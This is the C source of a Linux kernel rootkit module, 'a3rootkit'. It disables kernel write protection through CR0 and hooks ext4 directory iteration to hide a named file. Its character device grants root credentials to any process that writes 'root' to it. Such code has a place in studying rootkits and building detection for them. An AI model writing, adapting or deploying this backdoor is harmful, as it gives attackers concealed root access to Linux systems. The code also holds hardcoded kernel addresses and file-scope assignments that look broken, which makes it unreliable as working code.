#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <asm/io.h>
#include <asm/pgtable.h>
#include <asm-generic/memory_model.h>
#include <asm/pgtable_types.h>
#include <asm/current.h>
#include <linux/sched.h>

#define DEVICE_NAME "a3rootkit"
#define CLASS_NAME "a3rootkit"

static int major_num;
static struct class *module_class;
static struct device *module_device;

static int a3_rootkit_open(struct inode *, struct file *);
static ssize_t a3_rootkit_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t a3_rootkit_write(struct file *, const char __user *, size_t, loff_t *);
static int a3_rootkit_release(struct inode *, struct file *);
static long a3_rootkit_ioctl(struct file *, unsigned int, unsigned long);

static struct file_operations a3_rootkit_ops = {
    .open = a3_rootkit_open,
    .read = a3_rootkit_read,
    .write = a3_rootkit_write,
    .release = a3_rootkit_release,
    .unlocked_ioctl = a3_rootkit_ioctl,
};

/*hide file*/
#define HOOK_BUF_SZ 0x30

struct hook_info {
    char hook_data[HOOK_BUF_SZ];
    char orig_data[HOOK_BUF_SZ];
    void (*hook_before) (size_t *args);
    size_t (*orig_func) (size_t, size_t, size_t, size_t, size_t, size_t);
    size_t (*hook_after) (size_t orig_ret, size_t *args);
};


struct hide_file_info {
    struct list_head list;
    char *file_name;
};

filldir_t* filldir, filldir64, compat_filldir;
struct file_operations *ext4_dir_operations;
struct list_head hide_file_list;

filldir = (filldir_t*)(0xffffffff9d29c7c0);
filldir64 = (filldir_t*)(0xffffffff9d29c620);
compat_filldir = (filldir_t*)(0xffffffff9d29bcb0);

//读取cr0寄存器
size_t a3_rootkit_read_cr0(void)
{
    size_t cr0;

    asm volatile (
        "movq  %%cr0, %%rax;"
        "movq  %%rax, %0;   "
        : "=r" (cr0) :: "%rax"
    );

    return cr0;
}

//写入数据到cr0寄存器
void a3_rootkit_write_cr0(size_t cr0)
{
    asm volatile (
        "movq   %0, %%rax;  "
        "movq  %%rax, %%cr0;"
        :: "r" (cr0) : "%rax"
    );
}

void a3_rootkit_disable_write_protect(void)
{
    size_t cr0_val;

    cr0_val = a3_rootkit_read_cr0();

    /* if already disable, do nothing */
    if ((cr0_val >> 16) & 1) {
        cr0_val &= ~(1 << 16);
        a3_rootkit_write_cr0(cr0_val);
    }
}

void a3_rootkit_enable_write_protect(void)
{
    size_t cr0_val;

    cr0_val = a3_rootkit_read_cr0();

    /* if already enable, do nothing */
    if (!((cr0_val >> 16) & 1)) {
        cr0_val |= (1 << 16);
        a3_rootkit_write_cr0(cr0_val);
    }
}

int a3_rootkit_check_file_to_hide(const char *filename, int namlen)
{
    struct hide_file_info *info = NULL;

    /* check for whether the file to be hide is in result and delete them */
    list_for_each_entry(info, &hide_file_list, list) {
        if (!strncmp(info->file_name, filename, namlen)) {
            return 1;
        }
    }

    return 0;
}

static int a3_rootkit_fake_filldir(struct dir_context *ctx, const char *name,
                                   int namlen, loff_t offset, u64 ino, 
                                   unsigned int d_type)
{
    if (a3_rootkit_check_file_to_hide(name, namlen)) {
        return 1;
    }

    return filldir(ctx, name, namlen, offset, ino, d_type);
}

static int a3_rootkit_fake_filldir64(struct dir_context *ctx, const char *name,
                                     int namlen, loff_t offset, u64 ino, 
                                     unsigned int d_type)
{
    if (a3_rootkit_check_file_to_hide(name, namlen)) {
        return 1;
    }

    return filldir64(ctx, name, namlen, offset, ino, d_type);
}

static int a3_rootkit_fake_compat_filldir(struct dir_context *ctx, const char *name,
                                          int namlen, loff_t offset, u64 ino, 
                                          unsigned int d_type)
{
    if (a3_rootkit_check_file_to_hide(name, namlen)) {
        return 1;
    }

    return compat_filldir(ctx, name, namlen, offset, ino, d_type);
}

int (*orig_ext4_iterate_shared) (struct file *, struct dir_context *);

static int a3_rootkit_fake_ext4_iterate_shared(struct file *file, 
                                               struct dir_context *ctx)
{
    printk("ctx->actor pointer is %p filldir address:%p \n", ctx->actor, filldir);
    //if (ctx->actor == filldir) {
    if (ctx->actor == 0xffffffff9d29c7c0) {
        ctx->actor = (void*) a3_rootkit_fake_filldir;
        printk(" ctx->actor = a3_rootkit_fake_filldir");
    //} else if (ctx->actor == filldir64) {
    } else if (ctx->actor == 0xffffffff9d29c620) {
        ctx->actor = (void*) a3_rootkit_fake_filldir64;
        printk(" ctx->actor = a3_rootkit_fake_filldir64");
    //} else if (ctx->actor == compat_filldir) {
    } else if (ctx->actor == 0xffffffff9d29bcb0) {
        ctx->actor = (void*) a3_rootkit_fake_compat_filldir;
        printk(" ctx->actor = a3_rootkit_fake_compat_filldir");
    } else {
        printk("Unexpected ctx->actor!");
        //panic("Unexpected ctx->actor!");//这行代码挺危险，因为在自己hook之前别人已经hook了，所以得到的地址可能在case之外
    }

    return orig_ext4_iterate_shared(file, ctx);
}

/* 这个函数用来添加新的隐藏文件：） */
void a3_rootkit_add_new_hide_file(const char *file_name)
{
    struct hide_file_info *info;

    info = kmalloc(sizeof(*info), GFP_KERNEL);
    info->file_name = kmalloc(strlen(file_name) + 1, GFP_KERNEL);
    strcpy(info->file_name, file_name);

    list_add(&info->list, &hide_file_list);
}

/* 你需要在模块初始化函数中调用该函数 */
void a3_rootkit_vfs_hide_file_subsystem_init(void)
{
    struct file *file;

    INIT_LIST_HEAD(&hide_file_list);
    a3_rootkit_add_new_hide_file("gui-config.json");

    a3_rootkit_disable_write_protect();

    file = filp_open("/", O_RDONLY, 0);
    if (IS_ERR(file)) {
        goto out;
    }

    ext4_dir_operations = file->f_op;
    printk(KERN_ERR "Got addr of ext4_dir_operations: %lx",ext4_dir_operations);
    orig_ext4_iterate_shared = ext4_dir_operations->iterate_shared;
    ext4_dir_operations->iterate_shared = a3_rootkit_fake_ext4_iterate_shared;

    filp_close(file, NULL);


out:
    a3_rootkit_enable_write_protect();
}

static int __init a3_rootkit_init(void)
{
    int err_code;
    a3_rootkit_vfs_hide_file_subsystem_init();

    printk(KERN_INFO"[a3_rootkit:] Module loaded. Start to register device...");

    /* register major num as char device */
    major_num = register_chrdev(0, DEVICE_NAME, &a3_rootkit_ops);
    if(major_num < 0) {
        printk(KERN_INFO "[a3_rootkit:] Failed to register a major number.\n");
        err_code = major_num;
        goto err_major;
    }    
    printk(KERN_INFO "[a3_rootkit:] Register complete, major number: %d\n", 
           major_num);

    /* create device class */
    module_class = class_create(THIS_MODULE, CLASS_NAME);
    if(IS_ERR(module_class)) {
        printk(KERN_INFO "[a3_rootkit:] Failed to register class device!\n");
        err_code = PTR_ERR(module_class);
        goto err_class;
    }
    printk(KERN_INFO "[a3_rootkit:] Class device register complete.\n");

    /* create device file */
    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), 
                                  NULL, DEVICE_NAME);
    if(IS_ERR(module_device)) {
        printk(KERN_INFO "[a3_rootkit:] Failed to create the device!\n");
        err_code = PTR_ERR(module_device);
        goto err_dev;
    }
    printk(KERN_INFO "[a3_rootkit:] Module loaded successfully.");

    return 0;

err_dev:
    class_destroy(module_class);
err_class:
    unregister_chrdev(major_num, DEVICE_NAME);
err_major:
    return err_code;
}

static void __exit a3_rootkit_exit(void)
{
    device_destroy(module_class, MKDEV(major_num, 0));
    class_destroy(module_class);
    unregister_chrdev(major_num, DEVICE_NAME);
    printk(KERN_INFO "[a3_rootkit:] Module clean up. See you next time.");
}


static int a3_rootkit_open(struct inode *inode, struct file *file)
{
    return 0;
}

static ssize_t a3_rootkit_read(struct file *file, char __user *buf, 
                               size_t count, loff_t *start)
{
    return count;
}

static ssize_t a3_rootkit_write(struct file *file, const char __user *buf, 
                                size_t count, loff_t *start)
{
    static char usr_data[0x100];
    int sz = count > 0x100 ? 0x100 : count;

    copy_from_user(usr_data, buf, sz);

    if (!strncmp(usr_data, "root", 4)) {
        struct cred *curr = current->cred;
        curr->uid = curr->euid = curr->suid = curr->fsuid = KUIDT_INIT(0);
        curr->gid = curr->egid = curr->sgid = curr->fsgid = KGIDT_INIT(0);
    }

    return sz;
}

static int a3_rootkit_release(struct inode *inode, struct file *file)
{
    return 0;
}

static long a3_rootkit_ioctl(struct file *file, unsigned int cmd, 
                             unsigned long arg)
{
    return 0;
}

module_init(a3_rootkit_init);
module_exit(a3_rootkit_exit);
MODULE_LICENSE("GPL");
MODULE_AUTHOR("arttnba3");
